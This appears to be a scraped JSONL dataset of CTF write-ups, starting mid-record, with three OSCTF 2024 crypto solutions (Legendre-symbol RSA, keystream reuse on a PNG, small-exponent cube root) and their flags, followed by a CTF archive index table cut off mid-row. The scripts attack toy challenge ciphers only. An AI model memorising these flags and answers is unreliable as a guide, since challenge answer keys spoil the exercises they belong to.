"scraped_at": "2025-10-26T16:00:36.492969", "synthetic": false}
{"id": "bitskrieg_OSCTF_2024_Write-ups_e8ee99ad91cd", "team": "bitskrieg", "event": "OSCTF_2024_Write-ups", "challenge_name": "QR", "challenge_description": "# Efficient RSA\n## Solution\n- $ct[i]$ should be quadratic residue if $bit$ was 0 as power would then be even\n- Check legendre symbol of $ct[i]$\n- If it is 1, append 0 else append 1\n\n## Script\n```python\nfrom cipher import ct\nfrom sage.all import *\n\np = 96517490730367252566551196176049957092195411726055764912412605750547823858339\nflag = ''\n\nfor i in ct:\n    a = Integer(i)\n    ls = kronecker_symbol(a, p)\n    if ls == 1:\n        flag += '0'\n    else:\n        flag += '1'\n\nprint(int(flag, 2).to_bytes(...", "attack_type": "RSA", "tools_used": [], "difficulty": "unknown", "writeup": "# Efficient RSA\n## Solution\n- $ct[i]$ should be quadratic residue if $bit$ was 0 as power would then be even\n- Check legendre symbol of $ct[i]$\n- If it is 1, append 0 else append 1\n\n## Script\n```python\nfrom cipher import ct\nfrom sage.all import *\n\np = 96517490730367252566551196176049957092195411726055764912412605750547823858339\nflag = ''\n\nfor i in ct:\n    a = Integer(i)\n    ls = kronecker_symbol(a, p)\n    if ls == 1:\n        flag += '0'\n    else:\n        flag += '1'\n\nprint(int(flag, 2).to_bytes(100).decode())\n```\n\n## Flag\n```\nOSCTF{d0_y0U_L0v3_m47H_?_<3}\n```", "solution_code": "from cipher import ct\nfrom sage.all import *\n\np = 96517490730367252566551196176049957092195411726055764912412605750547823858339\nflag = ''\n\nfor i in ct:\n    a = Integer(i)\n    ls = kronecker_symbol(a, p)\n    if ls == 1:\n        flag += '0'\n    else:\n        flag += '1'\n\nprint(int(flag, 2).to_bytes(100).decode())", "url": "https://github.com/bitskriegofficial/OSCTF_2024_Write-ups/blob/main/crypto/QR.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:37.102776", "synthetic": false}
{"id": "bitskrieg_OSCTF_2024_Write-ups_ffbc04a9dc0c", "team": "bitskrieg", "event": "OSCTF_2024_Write-ups", "challenge_name": "Sheep Counting", "challenge_description": "# Sheep Counting\n## Solution\n- `keystream` always remain constant\n- We can use parts of PNG Header to re-construct it\n- Use it again to reconstruct the whole PNG\n\n## Script\n```python\nfrom pwn import xor\n\nwith open('encrypted_1.txt', 'r') as f:\n    data = f.read()\n\nchunks = []\nfor i in range(0, len(data), 32):\n    chunks.append(bytes.fromhex(data[i:i+32]))\n\nenc0 = xor(chunks[0][:8], b\"\\x89PNG\\x0d\\x0a\\x1a\\x0a\")\nenc1 = xor(chunks[-1][2:14], b\"\\x00\\x00\\x00\\x00IEND\\xae\\x42\\x60\\x82\")\nenc2 = xor(chunks...", "attack_type": "XOR", "tools_used": [], "difficulty": "unknown", "writeup": "# Sheep Counting\n## Solution\n- `keystream` always remain constant\n- We can use parts of PNG Header to re-construct it\n- Use it again to reconstruct the whole PNG\n\n## Script\n```python\nfrom pwn import xor\n\nwith open('encrypted_1.txt', 'r') as f:\n    data = f.read()\n\nchunks = []\nfor i in range(0, len(data), 32):\n    chunks.append(bytes.fromhex(data[i:i+32]))\n\nenc0 = xor(chunks[0][:8], b\"\\x89PNG\\x0d\\x0a\\x1a\\x0a\")\nenc1 = xor(chunks[-1][2:14], b\"\\x00\\x00\\x00\\x00IEND\\xae\\x42\\x60\\x82\")\nenc2 = xor(chunks[0][-4:], b\"IHDR\")\nenc = enc0[:2] + enc1 + enc2[2:]\nprint(len(enc))\n\nout = b''\nfor i in chunks:\n    out += xor(i, enc)\n\nwith open('out.png', 'wb') as f:\n    f.write(out)\n```\n\n## Flag\n```\nOSCTF{SH33P_CouNT1ng_111}\n```", "solution_code": "from pwn import xor\n\nwith open('encrypted_1.txt', 'r') as f:\n    data = f.read()\n\nchunks = []\nfor i in range(0, len(data), 32):\n    chunks.append(bytes.fromhex(data[i:i+32]))\n\nenc0 = xor(chunks[0][:8], b\"\\x89PNG\\x0d\\x0a\\x1a\\x0a\")\nenc1 = xor(chunks[-1][2:14], b\"\\x00\\x00\\x00\\x00IEND\\xae\\x42\\x60\\x82\")\nenc2 = xor(chunks[0][-4:], b\"IHDR\")\nenc = enc0[:2] + enc1 + enc2[2:]\nprint(len(enc))\n\nout = b''\nfor i in chunks:\n    out += xor(i, enc)\n\nwith open('out.png', 'wb') as f:\n    f.write(out)", "url": "https://github.com/bitskriegofficial/OSCTF_2024_Write-ups/blob/main/crypto/Sheep%20Counting.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:37.447642", "synthetic": false}
{"id": "bitskrieg_OSCTF_2024_Write-ups_d1955af04149", "team": "bitskrieg", "event": "OSCTF_2024_Write-ups", "challenge_name": "The Secret Message", "challenge_description": "# The Secret Message\n## Solution\n- Small $e$\n- Compute $\\sqrt[3]{ct}$ to get the flag\n\n## Script\n```python\nfrom sage.all import *\n\nct = Integer(123455882152544968263105106204728561055927061837559618140477097078038573915018542652304779417958037315601542697001430243903815208295768006065618427997903855304186888710867473025125)\npt = int(ct.nth_root(3))\nprint(pt.to_bytes(100).decode())\n```\n\n## Flag\n```\nOSCTF{Cub3_R00Ting_RSA!!}\n```", "attack_type": "RSA", "tools_used": [], "difficulty": "unknown", "writeup": "# The Secret Message\n## Solution\n- Small $e$\n- Compute $\\sqrt[3]{ct}$ to get the flag\n\n## Script\n```python\nfrom sage.all import *\n\nct = Integer(123455882152544968263105106204728561055927061837559618140477097078038573915018542652304779417958037315601542697001430243903815208295768006065618427997903855304186888710867473025125)\npt = int(ct.nth_root(3))\nprint(pt.to_bytes(100).decode())\n```\n\n## Flag\n```\nOSCTF{Cub3_R00Ting_RSA!!}\n```", "solution_code": "from sage.all import *\n\nct = Integer(123455882152544968263105106204728561055927061837559618140477097078038573915018542652304779417958037315601542697001430243903815208295768006065618427997903855304186888710867473025125)\npt = int(ct.nth_root(3))\nprint(pt.to_bytes(100).decode())", "url": "https://github.com/bitskriegofficial/OSCTF_2024_Write-ups/blob/main/crypto/The%20Secret%20Message.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:37.788813", "synthetic": false}
{"id": "sajjadium_ctf-archives_c2357c241144", "team": "sajjadium", "event": "ctf-archives", "challenge_name": "README", "challenge_description": "<table>\n    <thead>\n        <tr>\n            <th>CTF</th>\n            <th>Event</th>\n            <th>Writeups</th>\n        </tr>\n    </thead>\n    <tbody>\n        <tr>\n            <td rowspan=9><a href=\"ctfs/0CTF\">0CTF</a></td>\n            <td><a href=\"ctfs/0CTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2448/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/0CTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftim...", "attack_type": "Classical", "tools_used": [], "difficulty": "unknown", "writeup": "<table>\n    <thead>\n        <tr>\n            <th>CTF</th>\n            <th>Event</th>\n            <th>Writeups</th>\n        </tr>\n    </thead>\n    <tbody>\n        <tr>\n            <td rowspan=9><a href=\"ctfs/0CTF\">0CTF</a></td>\n            <td><a href=\"ctfs/0CTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2448/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/0CTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2073/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/0CTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1717/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/0CTF/2021/Quals\">2021 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1356/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/0CTF/2020/Quals\">2020 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1026/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/0CTF/2019/Quals\">2019 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/736/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/0CTF/2018/Finals\">2018 Finals</a></td>\n            <td><a href=\"https://ctftime.org/event/558/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/0CTF/2018/Finals\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/0CTF/2018/Quals\">2018 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/557/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/0CTF/2018/Quals\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/0CTF/2017/Quals\">2017 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/402/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/0CTF/2017/Quals\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/0x41414141\">0x41414141</a></td>\n            <td><a href=\"ctfs/0x41414141/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1249/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/0xL4ugh\">0xL4ugh</a></td>\n            <td><a href=\"ctfs/0xL4ugh/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2216/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/0xL4ugh/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1248/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/24hCTF\">24hCTF</a></td>\n            <td><a href=\"ctfs/24hCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2310/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/24hCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1968/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/1337UP\">1337UP</a></td>\n            <td><a href=\"ctfs/1337UP/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2446/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/1337UP/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2134/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/1337UP/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1597/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/1753CTF\">1753CTF</a></td>\n            <td><a href=\"ctfs/1753CTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2639/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/3kCTF\">3kCTF</a></td>\n            <td><a href=\"ctfs/3kCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1077/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/4N0NYM0US3\">4N0NYM0US3</a></td>\n            <td><a href=\"ctfs/4N0NYM0US3/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2028/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/4TS\">4TS</a></td>\n            <td><a href=\"ctfs/4TS/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2545/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/ADDA\">ADDA</a></td>\n            <td><a href=\"ctfs/ADDA/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1736/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/AI\">AI</a></td>\n            <td><a href=\"ctfs/ALLES/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2383/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/ALLES\">ALLES</a></td>\n            <td><a href=\"ctfs/ALLES/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1313/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ALLES/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1091/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=16><a href=\"ctfs/ASIS\">ASIS</a></td>\n            <td><a href=\"ctfs/ASIS/2025/Quals\">2025 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2612/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ASIS/2024/Finals\">2024 Finals</a></td>\n            <td><a href=\"https://ctftime.org/event/2403/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ASIS/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2211/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ASIS/2023/Finals\">2023 Finals</a></td>\n            <td><a href=\"https://ctftime.org/event/1953/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ASIS/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1952/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ASIS/2022/Finals\">2022 Finals</a></td>\n            <td><a href=\"https://ctftime.org/event/1725/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ASIS/2022/Quals\">2022 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1574/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ASIS/2021/Finals\">2021 Finals</a></td>\n            <td><a href=\"https://ctftime.org/event/1416/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ASIS/2021/Quals\">2021 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1415/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ASIS/2020/Finals\">2020 Finals</a></td>\n            <td><a href=\"https://ctftime.org/event/1111/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ASIS/2020/Quals\">2020 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/964/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ASIS/2019/Finals\">2019 Finals</a></td>\n            <td><a href=\"https://ctftime.org/event/805/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ASIS/2019/Quals\">2019 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/732/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ASIS/2018/Finals\">2018 Finals</a></td>\n            <td><a href=\"https://ctftime.org/event/620/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/ASIS/2018/Finals\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ASIS/2018/Quals\">2018 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/568/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/ASIS/2018/Quals\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ASIS/2017/Quals\">2017 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/364/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/AUCTF\">AUCTF</a></td>\n            <td><a href=\"ctfs/AUCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1020/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/AccessDenied\">AccessDenied</a></td>\n            <td><a href=\"ctfs/AccessDenied/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1652/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/Aero\">Aero</a></td>\n            <td><a href=\"ctfs/Aero/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1659/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Aero/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1224/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Aero/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/772/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/AfricabattleCTF\">AfricabattleCTF</a></td>\n            <td><a href=\"ctfs/AfricabattleCTF/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2531/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/AfricabattleCTF/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2024/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/AirOverflow\">AirOverflow</a></td>\n            <td><a href=\"ctfs/AirOverflow/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2360/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Akasec\">Akasec</a></td>\n            <td><a href=\"ctfs/Akasec/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2222/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/AlpacaHack\">AlpacaHack</a></td>\n            <td><a href=\"ctfs/AlpacaHack/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/ctf/2633\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/AlpacaHack/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/ctf/1163\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/AmateursCTF\">AmateursCTF</a></td>\n            <td><a href=\"ctfs/AmateursCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2226/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/AmateursCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1983/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/ApoorvCTF\">ApoorvCTF</a></td>\n            <td><a href=\"ctfs/ApoorvCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2638/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/AppSecVillage\">AppSecVillage (CTF)2</a></td>\n            <td><a href=\"ctfs/AppSecVillage/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1110/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/AptosCodeCollision\">AptosCodeCollision</a></td>\n            <td><a href=\"ctfs/AptosCodeCollision/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2433/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/ArabSecurityCyberWargames\">ArabSecurityCyberWargames</a></td>\n            <td><a href=\"ctfs/ArabSecurityCyberWargames/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2046/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Auvergnhack\">Auvergnhack</a></td>\n            <td><a href=\"ctfs/Auvergnhack/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2752/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/AzureAssassinAlliance\">AzureAssassinAlliance</a></td>\n            <td><a href=\"ctfs/AzureAssassinAlliance/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2104/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/AzureAssassinAlliance/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1682/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/BCACTF\">BCACTF</a></td>\n            <td><a href=\"ctfs/BCACTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2836/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BCACTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2274/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BCACTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1941/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BCACTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1602/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BCACTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1369/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/BCTF\">BCTF</a></td>\n            <td><a href=\"ctfs/BCTF/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/708/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/BITSCTF\">BITSCTF</a></td>\n            <td><a href=\"ctfs/BITSCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2607/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BITSCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2235/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/BRICS+\">BRICS+</a></td>\n            <td><a href=\"ctfs/BRICS+/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2389/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BRICS+/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2103/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/BSidesAhmedabad\">BSides Ahmedabad</a></td>\n            <td><a href=\"ctfs/BSidesAhmedabad/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1466/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BSidesAhmedabad/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1065/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/BSidesAlgiers\">BSides Algiers</a></td>\n            <td><a href=\"ctfs/BSidesAlgiers/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1950/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BSidesAlgiers/2020/Quals\">2020 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1220/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/BSidesBOS\">BSidesBOS</a></td>\n            <td><a href=\"ctfs/BSidesBOS/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1125/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/BSidesCanberra\">BSides Canberra</a></td>\n            <td><a href=\"ctfs/BSidesCanberra/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1314/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/BSidesDelhi\">BSides Delhi</a></td>\n            <td><a href=\"ctfs/BSidesDelhi/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1158/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BSidesDelhi/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/700/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/BSidesDelhi/2018\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/BSidesIndore\">BSides Indore</a></td>\n            <td><a href=\"ctfs/BSidesIndore/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2017/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/BSidesMumbai\">BSides Mumbai</a></td>\n            <td><a href=\"ctfs/BSidesMumbai/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2781/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BSidesMumbai/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2369/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BSidesMumbai/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1800/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/BSidesNoida\">BSides Noida</a></td>\n            <td><a href=\"ctfs/BSidesNoida/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1397/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=6><a href=\"ctfs/BSidesSF\">BSidesSF</a></td>\n            <td><a href=\"ctfs/BSidesSF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2357/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BSidesSF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1932/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BSidesSF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1666/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BSidesSF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1299/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BSidesSF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/977/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BSidesSF/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/753/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/BSidesSF/2019\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/BSidesTLV\">BSidesTLV</a></td>\n            <td><a href=\"ctfs/BSidesTLV/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2008/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BSidesTLV/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1680/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BSidesTLV/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1403/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BSidesTLV/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1078/tasks/\" 